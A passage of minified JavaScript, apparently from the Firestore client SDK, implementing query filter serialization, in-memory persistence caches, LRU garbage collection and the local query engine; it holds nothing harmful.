ki?(function(n){if(n.op==="=="){if(Ine(n.value))return{unaryFilter:{field:Fb(n.field),op:"IS_NAN"}};if(xne(n.value))return{unaryFilter:{field:Fb(n.field),op:"IS_NULL"}}}else if(n.op==="!="){if(Ine(n.value))return{unaryFilter:{field:Fb(n.field),op:"IS_NOT_NAN"}};if(xne(n.value))return{unaryFilter:{field:Fb(n.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:Fb(n.field),op:mWe(n.op),value:n.value}}})(t):t instanceof $u?(function(n){const r=n.getFilters().map((i=>Ffe(i)));return r.length===1?r[0]:{compositeFilter:{op:gWe(n.op),filters:r}}})(t):Ft(54877,{filter:t})}function yWe(t){const e=[];return t.fields.forEach((n=>e.push(n.canonicalString()))),{fieldPaths:e}}function $fe(t){return t.length>=4&&t.get(0)==="projects"&&t.get(2)==="databases"}class yp{constructor(e,n,r,i,s=qt.min(),o=qt.min(),a=xs.EMPTY_BYTE_STRING,c=null){this.target=e,this.targetId=n,this.purpose=r,this.sequenceNumber=i,this.snapshotVersion=s,this.lastLimboFreeSnapshotVersion=o,this.resumeToken=a,this.expectedCount=c}withSequenceNumber(e){return new yp(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,n){return new yp(this.target,this.targetId,this.purpose,this.sequenceNumber,n,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new yp(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new yp(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}class bWe{constructor(e){this.yt=e}}function wWe(t){const e=fWe({parent:t.parent,structuredQuery:t.structuredQuery});return t.limitType==="LAST"?LD(e,e.limit,"L"):e}class vWe{constructor(){this.Cn=new EWe}addToCollectionParentIndex(e,n){return this.Cn.add(n),He.resolve()}getCollectionParents(e,n){return He.resolve(this.Cn.getEntries(n))}addFieldIndex(e,n){return He.resolve()}deleteFieldIndex(e,n){return He.resolve()}deleteAllFieldIndexes(e){return He.resolve()}createTargetIndexes(e,n){return He.resolve()}getDocumentsMatchingTarget(e,n){return He.resolve(null)}getIndexType(e,n){return He.resolve(0)}getFieldIndexes(e,n){return He.resolve([])}getNextCollectionGroupToUpdate(e){return He.resolve(null)}getMinOffset(e,n){return He.resolve(Fp.min())}getMinOffsetFromCollectionGroup(e,n){return He.resolve(Fp.min())}updateCollectionGroup(e,n,r){return He.resolve()}updateIndexEntries(e,n){return He.resolve()}}class EWe{constructor(){this.index={}}add(e){const n=e.lastSegment(),r=e.popLast(),i=this.index[n]||new qi(Sr.comparator),s=!i.has(r);return this.index[n]=i.add(r),s}has(e){const n=e.lastSegment(),r=e.popLast(),i=this.index[n];return i&&i.has(r)}getEntries(e){return(this.index[e]||new qi(Sr.comparator)).toArray()}}const Hne={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},Hfe=41943040;class Go{static withCacheSize(e){return new Go(e,Go.DEFAULT_COLLECTION_PERCENTILE,Go.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}constructor(e,n,r){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=n,this.maximumSequenceNumbersToCollect=r}}Go.DEFAULT_COLLECTION_PERCENTILE=10,Go.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,Go.DEFAULT=new Go(Hfe,Go.DEFAULT_COLLECTION_PERCENTILE,Go.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),Go.DISABLED=new Go(-1,0,0);class X1{constructor(e){this.ar=e}next(){return this.ar+=2,this.ar}static ur(){return new X1(0)}static cr(){return new X1(-1)}}const zne="LruGarbageCollector",_We=1048576;function qne([t,e],[n,r]){const i=pn(t,n);return i===0?pn(e,r):i}class AWe{constructor(e){this.Ir=e,this.buffer=new qi(qne),this.Er=0}dr(){return++this.Er}Ar(e){const n=[e,this.dr()];if(this.buffer.size<this.Ir)this.buffer=this.buffer.add(n);else{const r=this.buffer.last();qne(n,r)<0&&(this.buffer=this.buffer.delete(r).add(n))}}get maxValue(){return this.buffer.last()[0]}}class CWe{constructor(e,n,r){this.garbageCollector=e,this.asyncQueue=n,this.localStore=r,this.Rr=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.Vr(6e4)}stop(){this.Rr&&(this.Rr.cancel(),this.Rr=null)}get started(){return this.Rr!==null}Vr(e){mt(zne,`Garbage collection scheduled in ${e}ms`),this.Rr=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,(async()=>{this.Rr=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(n){Cw(n)?mt(zne,"Ignoring IndexedDB error during garbage collection: ",n):await Aw(n)}await this.Vr(3e5)}))}}class SWe{constructor(e,n){this.mr=e,this.params=n}calculateTargetCount(e,n){return this.mr.gr(e).next((r=>Math.floor(n/100*r)))}nthSequenceNumber(e,n){if(n===0)return He.resolve(dR.ce);const r=new AWe(n);return this.mr.forEachTarget(e,(i=>r.Ar(i.sequenceNumber))).next((()=>this.mr.pr(e,(i=>r.Ar(i))))).next((()=>r.maxValue))}removeTargets(e,n,r){return this.mr.removeTargets(e,n,r)}removeOrphanedDocuments(e,n){return this.mr.removeOrphanedDocuments(e,n)}collect(e,n){return this.params.cacheSizeCollectionThreshold===-1?(mt("LruGarbageCollector","Garbage collection skipped; disabled"),He.resolve(Hne)):this.getCacheSize(e).next((r=>r<this.params.cacheSizeCollectionThreshold?(mt("LruGarbageCollector",`Garbage collection skipped; Cache size ${r} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),Hne):this.yr(e,n)))}getCacheSize(e){return this.mr.getCacheSize(e)}yr(e,n){let r,i,s,o,a,c,l;const f=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next((h=>(h>this.params.maximumSequenceNumbersToCollect?(mt("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${h}`),i=this.params.maximumSequenceNumbersToCollect):i=h,o=Date.now(),this.nthSequenceNumber(e,i)))).next((h=>(r=h,a=Date.now(),this.removeTargets(e,r,n)))).next((h=>(s=h,c=Date.now(),this.removeOrphanedDocuments(e,r)))).next((h=>(l=Date.now(),Ub()<=Tn.DEBUG&&mt("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${o-f}ms
	Determined least recently used ${i} in `+(a-o)+`ms
	Removed ${s} targets in `+(c-a)+`ms
	Removed ${h} documents in `+(l-c)+`ms
Total Duration: ${l-f}ms`),He.resolve({didRun:!0,sequenceNumbersCollected:i,targetsRemoved:s,documentsRemoved:h}))))}}function TWe(t,e){return new SWe(t,e)}class xWe{constructor(){this.changes=new hy((e=>e.toString()),((e,n)=>e.isEqual(n))),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,n){this.assertNotApplied(),this.changes.set(e,Gs.newInvalidDocument(e).setReadTime(n))}getEntry(e,n){this.assertNotApplied();const r=this.changes.get(n);return r!==void 0?He.resolve(r):this.getFromCache(e,n)}getEntries(e,n){return this.getAllFromCache(e,n)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}class IWe{constructor(e,n){this.overlayedDocument=e,this.mutatedFields=n}}class RWe{constructor(e,n,r,i){this.remoteDocumentCache=e,this.mutationQueue=n,this.documentOverlayCache=r,this.indexManager=i}getDocument(e,n){let r=null;return this.documentOverlayCache.getOverlay(e,n).next((i=>(r=i,this.remoteDocumentCache.getEntry(e,n)))).next((i=>(r!==null&&vE(r.mutation,i,Du.empty(),kr.now()),i)))}getDocuments(e,n){return this.remoteDocumentCache.getEntries(e,n).next((r=>this.getLocalViewOfDocuments(e,r,mn()).next((()=>r))))}getLocalViewOfDocuments(e,n,r=mn()){const i=Wm();return this.populateOverlays(e,i,n).next((()=>this.computeViews(e,n,i,r).next((s=>{let o=X2();return s.forEach(((a,c)=>{o=o.insert(a,c.overlayedDocument)})),o}))))}getOverlayedDocuments(e,n){const r=Wm();return this.populateOverlays(e,r,n).next((()=>this.computeViews(e,n,r,mn())))}populateOverlays(e,n,r){const i=[];return r.forEach((s=>{n.has(s)||i.push(s)})),this.documentOverlayCache.getOverlays(e,i).next((s=>{s.forEach(((o,a)=>{n.set(o,a)}))}))}computeViews(e,n,r,i){let s=qf();const o=wE(),a=(function(){return wE()})();return n.forEach(((c,l)=>{const f=r.get(l.key);i.has(l.key)&&(f===void 0||f.mutation instanceof py)?s=s.insert(l.key,l):f!==void 0?(o.set(l.key,f.mutation.getFieldMask()),vE(f.mutation,l,f.mutation.getFieldMask(),kr.now())):o.set(l.key,Du.empty())})),this.recalculateAndSaveOverlays(e,s).next((c=>(c.forEach(((l,f)=>o.set(l,f))),n.forEach(((l,f)=>a.set(l,new IWe(f,o.get(l)??null)))),a)))}recalculateAndSaveOverlays(e,n){const r=wE();let i=new Yr(((o,a)=>o-a)),s=mn();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,n).next((o=>{for(const a of o)a.keys().forEach((c=>{const l=n.get(c);if(l===null)return;let f=r.get(c)||Du.empty();f=a.applyToLocalView(l,f),r.set(c,f);const h=(i.get(a.batchId)||mn()).add(c);i=i.insert(a.batchId,h)}))})).next((()=>{const o=[],a=i.getReverseIterator();for(;a.hasNext();){const c=a.getNext(),l=c.key,f=c.value,h=Afe();f.forEach((m=>{if(!s.has(m)){const b=Rfe(n.get(m),r.get(m));b!==null&&h.set(m,b),s=s.add(m)}})),o.push(this.documentOverlayCache.saveOverlays(e,l,h))}return He.waitFor(o)})).next((()=>r))}recalculateAndSaveOverlaysForDocumentKeys(e,n){return this.remoteDocumentCache.getEntries(e,n).next((r=>this.recalculateAndSaveOverlays(e,r)))}getDocumentsMatchingQuery(e,n,r,i){return(function(o){return Pt.isDocumentKey(o.path)&&o.collectionGroup===null&&o.filters.length===0})(n)?this.getDocumentsMatchingDocumentQuery(e,n.path):bfe(n)?this.getDocumentsMatchingCollectionGroupQuery(e,n,r,i):this.getDocumentsMatchingCollectionQuery(e,n,r,i)}getNextDocuments(e,n,r,i){return this.remoteDocumentCache.getAllFromCollectionGroup(e,n,r,i).next((s=>{const o=i-s.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,n,r.largestBatchId,i-s.size):He.resolve(Wm());let a=j_,c=s;return o.next((l=>He.forEach(l,((f,h)=>(a<h.largestBatchId&&(a=h.largestBatchId),s.get(f)?He.resolve():this.remoteDocumentCache.getEntry(e,f).next((m=>{c=c.insert(f,m)}))))).next((()=>this.populateOverlays(e,l,s))).next((()=>this.computeViews(e,c,l,mn()))).next((f=>({batchId:a,changes:_fe(f)})))))}))}getDocumentsMatchingDocumentQuery(e,n){return this.getDocument(e,new Pt(n)).next((r=>{let i=X2();return r.isFoundDocument()&&(i=i.insert(r.key,r)),i}))}getDocumentsMatchingCollectionGroupQuery(e,n,r,i){const s=n.collectionGroup;let o=X2();return this.indexManager.getCollectionParents(e,s).next((a=>He.forEach(a,(c=>{const l=(function(h,m){return new i5(m,null,h.explicitOrderBy.slice(),h.filters.slice(),h.limit,h.limitType,h.startAt,h.endAt)})(n,c.child(s));return this.getDocumentsMatchingCollectionQuery(e,l,r,i).next((f=>{f.forEach(((h,m)=>{o=o.insert(h,m)}))}))})).next((()=>o))))}getDocumentsMatchingCollectionQuery(e,n,r,i){let s;return this.documentOverlayCache.getOverlaysForCollection(e,n.path,r.largestBatchId).next((o=>(s=o,this.remoteDocumentCache.getDocumentsMatchingQuery(e,n,r,s,i)))).next((o=>{s.forEach(((c,l)=>{const f=l.getKey();o.get(f)===null&&(o=o.insert(f,Gs.newInvalidDocument(f)))}));let a=X2();return o.forEach(((c,l)=>{const f=s.get(c);f!==void 0&&vE(f.mutation,l,Du.empty(),kr.now()),gR(n,l)&&(a=a.insert(c,l))})),a}))}}class PWe{constructor(e){this.serializer=e,this.Lr=new Map,this.kr=new Map}getBundleMetadata(e,n){return He.resolve(this.Lr.get(n))}saveBundleMetadata(e,n){return this.Lr.set(n.id,(function(i){return{id:i.id,version:i.version,createTime:ql(i.createTime)}})(n)),He.resolve()}getNamedQuery(e,n){return He.resolve(this.kr.get(n))}saveNamedQuery(e,n){return this.kr.set(n.name,(function(i){return{name:i.name,query:wWe(i.bundledQuery),readTime:ql(i.readTime)}})(n)),He.resolve()}}class NWe{constructor(){this.overlays=new Yr(Pt.comparator),this.qr=new Map}getOverlay(e,n){return He.resolve(this.overlays.get(n))}getOverlays(e,n){const r=Wm();return He.forEach(n,(i=>this.getOverlay(e,i).next((s=>{s!==null&&r.set(i,s)})))).next((()=>r))}saveOverlays(e,n,r){return r.forEach(((i,s)=>{this.St(e,n,s)})),He.resolve()}removeOverlaysForBatchId(e,n,r){const i=this.qr.get(r);return i!==void 0&&(i.forEach((s=>this.overlays=this.overlays.remove(s))),this.qr.delete(r)),He.resolve()}getOverlaysForCollection(e,n,r){const i=Wm(),s=n.length+1,o=new Pt(n.child("")),a=this.overlays.getIteratorFrom(o);for(;a.hasNext();){const c=a.getNext().value,l=c.getKey();if(!n.isPrefixOf(l.path))break;l.path.length===s&&c.largestBatchId>r&&i.set(c.getKey(),c)}return He.resolve(i)}getOverlaysForCollectionGroup(e,n,r,i){let s=new Yr(((l,f)=>l-f));const o=this.overlays.getIterator();for(;o.hasNext();){const l=o.getNext().value;if(l.getKey().getCollectionGroup()===n&&l.largestBatchId>r){let f=s.get(l.largestBatchId);f===null&&(f=Wm(),s=s.insert(l.largestBatchId,f)),f.set(l.getKey(),l)}}const a=Wm(),c=s.getIterator();for(;c.hasNext()&&(c.getNext().value.forEach(((l,f)=>a.set(l,f))),!(a.size()>=i)););return He.resolve(a)}St(e,n,r){const i=this.overlays.get(r.key);if(i!==null){const o=this.qr.get(i.largestBatchId).delete(r.key);this.qr.set(i.largestBatchId,o)}this.overlays=this.overlays.insert(r.key,new ZVe(n,r));let s=this.qr.get(n);s===void 0&&(s=mn(),this.qr.set(n,s)),this.qr.set(n,s.add(r.key))}}class OWe{constructor(){this.sessionToken=xs.EMPTY_BYTE_STRING}getSessionToken(e){return He.resolve(this.sessionToken)}setSessionToken(e,n){return this.sessionToken=n,He.resolve()}}class QM{constructor(){this.Qr=new qi(Xi.$r),this.Ur=new qi(Xi.Kr)}isEmpty(){return this.Qr.isEmpty()}addReference(e,n){const r=new Xi(e,n);this.Qr=this.Qr.add(r),this.Ur=this.Ur.add(r)}Wr(e,n){e.forEach((r=>this.addReference(r,n)))}removeReference(e,n){this.Gr(new Xi(e,n))}zr(e,n){e.forEach((r=>this.removeReference(r,n)))}jr(e){const n=new Pt(new Sr([])),r=new Xi(n,e),i=new Xi(n,e+1),s=[];return this.Ur.forEachInRange([r,i],(o=>{this.Gr(o),s.push(o.key)})),s}Jr(){this.Qr.forEach((e=>this.Gr(e)))}Gr(e){this.Qr=this.Qr.delete(e),this.Ur=this.Ur.delete(e)}Hr(e){const n=new Pt(new Sr([])),r=new Xi(n,e),i=new Xi(n,e+1);let s=mn();return this.Ur.forEachInRange([r,i],(o=>{s=s.add(o.key)})),s}containsKey(e){const n=new Xi(e,0),r=this.Qr.firstAfterOrEqual(n);return r!==null&&e.isEqual(r.key)}}class Xi{constructor(e,n){this.key=e,this.Yr=n}static $r(e,n){return Pt.comparator(e.key,n.key)||pn(e.Yr,n.Yr)}static Kr(e,n){return pn(e.Yr,n.Yr)||Pt.comparator(e.key,n.key)}}class kWe{constructor(e,n){this.indexManager=e,this.referenceDelegate=n,this.mutationQueue=[],this.tr=1,this.Zr=new qi(Xi.$r)}checkEmpty(e){return He.resolve(this.mutationQueue.length===0)}addMutationBatch(e,n,r,i){const s=this.tr;this.tr++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const o=new KVe(s,n,r,i);this.mutationQueue.push(o);for(const a of i)this.Zr=this.Zr.add(new Xi(a.key,s)),this.indexManager.addToCollectionParentIndex(e,a.key.path.popLast());return He.resolve(o)}lookupMutationBatch(e,n){return He.resolve(this.Xr(n))}getNextMutationBatchAfterBatchId(e,n){const r=n+1,i=this.ei(r),s=i<0?0:i;return He.resolve(this.mutationQueue.length>s?this.mutationQueue[s]:null)}getHighestUnacknowledgedBatchId(){return He.resolve(this.mutationQueue.length===0?HM:this.tr-1)}getAllMutationBatches(e){return He.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,n){const r=new Xi(n,0),i=new Xi(n,Number.POSITIVE_INFINITY),s=[];return this.Zr.forEachInRange([r,i],(o=>{const a=this.Xr(o.Yr);s.push(a)})),He.resolve(s)}getAllMutationBatchesAffectingDocumentKeys(e,n){let r=new qi(pn);return n.forEach((i=>{const s=new Xi(i,0),o=new Xi(i,Number.POSITIVE_INFINITY);this.Zr.forEachInRange([s,o],(a=>{r=r.add(a.Yr)}))})),He.resolve(this.ti(r))}getAllMutationBatchesAffectingQuery(e,n){const r=n.path,i=r.length+1;let s=r;Pt.isDocumentKey(s)||(s=s.child(""));const o=new Xi(new Pt(s),0);let a=new qi(pn);return this.Zr.forEachWhile((c=>{const l=c.key.path;return!!r.isPrefixOf(l)&&(l.length===i&&(a=a.add(c.Yr)),!0)}),o),He.resolve(this.ti(a))}ti(e){const n=[];return e.forEach((r=>{const i=this.Xr(r);i!==null&&n.push(i)})),n}removeMutationBatch(e,n){Kn(this.ni(n.batchId,"removed")===0,55003),this.mutationQueue.shift();let r=this.Zr;return He.forEach(n.mutations,(i=>{const s=new Xi(i.key,n.batchId);return r=r.delete(s),this.referenceDelegate.markPotentiallyOrphaned(e,i.key)})).next((()=>{this.Zr=r}))}ir(e){}containsKey(e,n){const r=new Xi(n,0),i=this.Zr.firstAfterOrEqual(r);return He.resolve(n.isEqual(i&&i.key))}performConsistencyCheck(e){return this.mutationQueue.length,He.resolve()}ni(e,n){return this.ei(e)}ei(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Xr(e){const n=this.ei(e);return n<0||n>=this.mutationQueue.length?null:this.mutationQueue[n]}}class DWe{constructor(e){this.ri=e,this.docs=(function(){return new Yr(Pt.comparator)})(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,n){const r=n.key,i=this.docs.get(r),s=i?i.size:0,o=this.ri(n);return this.docs=this.docs.insert(r,{document:n.mutableCopy(),size:o}),this.size+=o-s,this.indexManager.addToCollectionParentIndex(e,r.path.popLast())}removeEntry(e){const n=this.docs.get(e);n&&(this.docs=this.docs.remove(e),this.size-=n.size)}getEntry(e,n){const r=this.docs.get(n);return He.resolve(r?r.document.mutableCopy():Gs.newInvalidDocument(n))}getEntries(e,n){let r=qf();return n.forEach((i=>{const s=this.docs.get(i);r=r.insert(i,s?s.document.mutableCopy():Gs.newInvalidDocument(i))})),He.resolve(r)}getDocumentsMatchingQuery(e,n,r,i){let s=qf();const o=n.path,a=new Pt(o.child("__id-9223372036854775808__")),c=this.docs.getIteratorFrom(a);for(;c.hasNext();){const{key:l,value:{document:f}}=c.getNext();if(!o.isPrefixOf(l.path))break;l.path.length>o.length+1||uVe(cVe(f),r)<=0||(i.has(f.key)||gR(n,f))&&(s=s.insert(f.key,f.mutableCopy()))}return He.resolve(s)}getAllFromCollectionGroup(e,n,r,i){Ft(9500)}ii(e,n){return He.forEach(this.docs,(r=>n(r)))}newChangeBuffer(e){return new BWe(this)}getSize(e){return He.resolve(this.size)}}class BWe extends xWe{constructor(e){super(),this.Nr=e}applyChanges(e){const n=[];return this.changes.forEach(((r,i)=>{i.isValidDocument()?n.push(this.Nr.addEntry(e,i)):this.Nr.removeEntry(r)})),He.waitFor(n)}getFromCache(e,n){return this.Nr.getEntry(e,n)}getAllFromCache(e,n){return this.Nr.getEntries(e,n)}}class jWe{constructor(e){this.persistence=e,this.si=new hy((n=>VM(n)),WM),this.lastRemoteSnapshotVersion=qt.min(),this.highestTargetId=0,this.oi=0,this._i=new QM,this.targetCount=0,this.ai=X1.ur()}forEachTarget(e,n){return this.si.forEach(((r,i)=>n(i))),He.resolve()}getLastRemoteSnapshotVersion(e){return He.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return He.resolve(this.oi)}allocateTargetId(e){return this.highestTargetId=this.ai.next(),He.resolve(this.highestTargetId)}setTargetsMetadata(e,n,r){return r&&(this.lastRemoteSnapshotVersion=r),n>this.oi&&(this.oi=n),He.resolve()}Pr(e){this.si.set(e.target,e);const n=e.targetId;n>this.highestTargetId&&(this.ai=new X1(n),this.highestTargetId=n),e.sequenceNumber>this.oi&&(this.oi=e.sequenceNumber)}addTargetData(e,n){return this.Pr(n),this.targetCount+=1,He.resolve()}updateTargetData(e,n){return this.Pr(n),He.resolve()}removeTargetData(e,n){return this.si.delete(n.target),this._i.jr(n.targetId),this.targetCount-=1,He.resolve()}removeTargets(e,n,r){let i=0;const s=[];return this.si.forEach(((o,a)=>{a.sequenceNumber<=n&&r.get(a.targetId)===null&&(this.si.delete(o),s.push(this.removeMatchingKeysForTargetId(e,a.targetId)),i++)})),He.waitFor(s).next((()=>i))}getTargetCount(e){return He.resolve(this.targetCount)}getTargetData(e,n){const r=this.si.get(n)||null;return He.resolve(r)}addMatchingKeys(e,n,r){return this._i.Wr(n,r),He.resolve()}removeMatchingKeys(e,n,r){this._i.zr(n,r);const i=this.persistence.referenceDelegate,s=[];return i&&n.forEach((o=>{s.push(i.markPotentiallyOrphaned(e,o))})),He.waitFor(s)}removeMatchingKeysForTargetId(e,n){return this._i.jr(n),He.resolve()}getMatchingKeysForTargetId(e,n){const r=this._i.Hr(n);return He.resolve(r)}containsKey(e,n){return He.resolve(this._i.containsKey(n))}}class zfe{constructor(e,n){this.ui={},this.overlays={},this.ci=new dR(0),this.li=!1,this.li=!0,this.hi=new OWe,this.referenceDelegate=e(this),this.Pi=new jWe(this),this.indexManager=new vWe,this.remoteDocumentCache=(function(i){return new DWe(i)})((r=>this.referenceDelegate.Ti(r))),this.serializer=new bWe(n),this.Ii=new PWe(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.li=!1,Promise.resolve()}get started(){return this.li}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let n=this.overlays[e.toKey()];return n||(n=new NWe,this.overlays[e.toKey()]=n),n}getMutationQueue(e,n){let r=this.ui[e.toKey()];return r||(r=new kWe(n,this.referenceDelegate),this.ui[e.toKey()]=r),r}getGlobalsCache(){return this.hi}getTargetCache(){return this.Pi}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Ii}runTransaction(e,n,r){mt("MemoryPersistence","Starting transaction:",e);const i=new MWe(this.ci.next());return this.referenceDelegate.Ei(),r(i).next((s=>this.referenceDelegate.di(i).next((()=>s)))).toPromise().then((s=>(i.raiseOnCommittedEvent(),s)))}Ai(e,n){return He.or(Object.values(this.ui).map((r=>()=>r.containsKey(e,n))))}}class MWe extends dVe{constructor(e){super(),this.currentSequenceNumber=e}}class JM{constructor(e){this.persistence=e,this.Ri=new QM,this.Vi=null}static mi(e){return new JM(e)}get fi(){if(this.Vi)return this.Vi;throw Ft(60996)}addReference(e,n,r){return this.Ri.addReference(r,n),this.fi.delete(r.toString()),He.resolve()}removeReference(e,n,r){return this.Ri.removeReference(r,n),this.fi.add(r.toString()),He.resolve()}markPotentiallyOrphaned(e,n){return this.fi.add(n.toString()),He.resolve()}removeTarget(e,n){this.Ri.jr(n.targetId).forEach((i=>this.fi.add(i.toString())));const r=this.persistence.getTargetCache();return r.getMatchingKeysForTargetId(e,n.targetId).next((i=>{i.forEach((s=>this.fi.add(s.toString())))})).next((()=>r.removeTargetData(e,n)))}Ei(){this.Vi=new Set}di(e){const n=this.persistence.getRemoteDocumentCache().newChangeBuffer();return He.forEach(this.fi,(r=>{const i=Pt.fromPath(r);return this.gi(e,i).next((s=>{s||n.removeEntry(i,qt.min())}))})).next((()=>(this.Vi=null,n.apply(e))))}updateLimboDocument(e,n){return this.gi(e,n).next((r=>{r?this.fi.delete(n.toString()):this.fi.add(n.toString())}))}Ti(e){return 0}gi(e,n){return He.or([()=>He.resolve(this.Ri.containsKey(n)),()=>this.persistence.getTargetCache().containsKey(e,n),()=>this.persistence.Ai(e,n)])}}class NI{constructor(e,n){this.persistence=e,this.pi=new hy((r=>pVe(r.path)),((r,i)=>r.isEqual(i))),this.garbageCollector=TWe(this,n)}static mi(e,n){return new NI(e,n)}Ei(){}di(e){return He.resolve()}forEachTarget(e,n){return this.persistence.getTargetCache().forEachTarget(e,n)}gr(e){const n=this.wr(e);return this.persistence.getTargetCache().getTargetCount(e).next((r=>n.next((i=>r+i))))}wr(e){let n=0;return this.pr(e,(r=>{n++})).next((()=>n))}pr(e,n){return He.forEach(this.pi,((r,i)=>this.br(e,r,i).next((s=>s?He.resolve():n(i)))))}removeTargets(e,n,r){return this.persistence.getTargetCache().removeTargets(e,n,r)}removeOrphanedDocuments(e,n){let r=0;const i=this.persistence.getRemoteDocumentCache(),s=i.newChangeBuffer();return i.ii(e,(o=>this.br(e,o,n).next((a=>{a||(r++,s.removeEntry(o,qt.min()))})))).next((()=>s.apply(e))).next((()=>r))}markPotentiallyOrphaned(e,n){return this.pi.set(n,e.currentSequenceNumber),He.resolve()}removeTarget(e,n){const r=n.withSequenceNumber(e.currentSequenceNumber);return this.persistence.getTargetCache().updateTargetData(e,r)}addReference(e,n,r){return this.pi.set(r,e.currentSequenceNumber),He.resolve()}removeReference(e,n,r){return this.pi.set(r,e.currentSequenceNumber),He.resolve()}updateLimboDocument(e,n){return this.pi.set(n,e.currentSequenceNumber),He.resolve()}Ti(e){let n=e.key.toString().length;return e.isFoundDocument()&&(n+=tx(e.data.value)),n}br(e,n,r){return He.or([()=>this.persistence.Ai(e,n),()=>this.persistence.getTargetCache().containsKey(e,n),()=>{const i=this.pi.get(n);return He.resolve(i!==void 0&&i>r)}])}getCacheSize(e){return this.persistence.getRemoteDocumentCache().getSize(e)}}class XM{constructor(e,n,r,i){this.targetId=e,this.fromCache=n,this.Es=r,this.ds=i}static As(e,n){let r=mn(),i=mn();for(const s of n.docChanges)switch(s.type){case 0:r=r.add(s.doc.key);break;case 1:i=i.add(s.doc.key)}return new XM(e,n.fromCache,r,i)}}class UWe{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}class LWe{constructor(){this.Rs=!1,this.Vs=!1,this.fs=100,this.gs=(function(){return Oze()?8:fVe(Pze())>0?6:4})()}initialize(e,n){this.ps=e,this.indexManager=n,this.Rs=!0}getDocumentsMatchingQuery(e,n,r,i){const s={result:null};return this.ys(e,n).next((o=>{s.result=o})).next((()=>{if(!s.result)return this.ws(e,n,i,r).next((o=>{s.result=o}))})).next((()=>{if(s.result)return;const o=new UWe;return this.Ss(e,n,o).next((a=>{if(s.result=a,this.Vs)return this.bs(e,n,o,a.size)}))})).next((()=>s.result))}bs(e,n,r,i){return r.documentReadCount<this.fs?(Ub()<=Tn.DEBUG&&mt("QueryEngine","SDK will not create cache indexes for query:",Lb(n),"since it only creates cache indexes for collection contains","more than or equal to",this.fs,"documents"),He.resolve()):(Ub()<=Tn.DEBUG&&mt("QueryEngine","Query:",Lb(n),"scans",r.documentReadCount,"local documents and returns",i,"documents as results."),r.documentReadCount>this.gs*i?(Ub()<=Tn.DEBUG&&mt("QueryEngine","The SDK decides to create cache indexes for query:",Lb(n),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,zl(n))):He.resolve())}ys(e,n){if(One(n))return He.resolve(null);let r=zl(n);return this.indexManager.getIndexType(e,r).next((i=>i===0?null:(n.limit!==null&&i===1&&(n=LD(n,null,"F"),r=zl(n)),this.indexManager.getDocumentsMatchingTarget(e,r).next((s=>{const o=mn(...s);return this.ps.getDocuments(e,o).next((a=>this.indexManager.getMinOffset(e,r).next((c=>{const l=this.Ds(n,a);return this.Cs(n,l,o,c.readTime)?this.ys(e,LD(n,null,"F")):this.vs(e,l,n,c)}))))})))))}ws(e,n,r,i){return One(n)||i.isEqual(qt.min())?He.resolve(null):this.ps.getDocuments(e,r).next((s=>{const o=this.Ds(n,s);return this.Cs(n,o,r,i)?He.resolve(null):(Ub()<=Tn.DEBUG&&mt("QueryEngine","Re-using previous result from %s to execute query: %s",i.toString(),Lb(n)),this.vs(e,o,n,aVe(i,j_)).next((a=>a)))}))}Ds(e,n){let r=new qi(vfe(e));return n.forEach(((i,s)=>{gR(e,s)&&(r=r.add(s))})),r}Cs(e,n,r,i){if(e.limit===null)return!1;if(r.size!==n.size)return!0;const s=e.limitType==="F"?n.last():n.first();return!!s&&(s.hasPendingWrites||s.version.compareTo(i)>0)}Ss(e,n,r){return Ub()<=Tn.DEBUG&&mt("QueryEngine","Using full collection scan to execute query:",Lb(n)),this.ps.getDocumentsMatchingQuery(e,n,Fp.min(),r)}vs(e,n,r,i){return this.ps.getDocumentsMatchingQuery(e,r,i).next((s=>(n.forEach((o=>{s=s.insert(o.key,o)})),s)))}}const eU="LocalStore",FWe=3e8;class $We{constructor(e,n,r,i){this.persistence=e,this.Fs=n,this.serializer=i,this.Ms=new Yr(pn),this.xs=new hy((s=>VM(s)),WM),this.Os=new 